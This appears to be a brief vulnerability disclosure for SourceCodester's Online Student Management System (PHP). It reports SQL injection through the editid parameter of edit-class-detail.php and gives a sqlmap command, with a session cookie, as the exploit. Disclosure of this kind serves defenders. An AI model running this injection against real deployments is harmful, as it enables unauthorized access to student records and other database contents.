vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16137/online-student-management-system-php-free-download.html

Vulnerability trigger parameter: $editid

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220947835-16ffbf2c-632d-483a-9065-e75ca20018ef.png)


exp

```
sqlmap.py -u "http://192.168.31.50/eduauth/student/edit-class-detail.php?editid=1" --cookie "PHPSESSID=po9tmu5iqkuvffteh4b6rur4g0"
```
![image](https://user-images.githubusercontent.com/30823782/220947885-642a868b-fd1f-45b7-a5d9-e6844c8f175d.png)

